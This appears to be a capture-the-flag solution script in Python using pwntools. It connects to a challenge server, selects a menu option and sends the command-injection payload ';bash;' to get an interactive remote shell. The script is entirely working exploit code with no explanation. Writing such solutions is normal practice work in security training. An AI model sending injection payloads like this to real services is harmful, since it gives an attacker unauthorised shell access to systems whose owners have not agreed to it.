from pwn import *

r = remote('node3.buuoj.cn', 25964)
r.recvuntil('choose:\n')
r.sendline('1')
r.recvline()
r.send(';bash;')
r.recvline()
r.interactive()
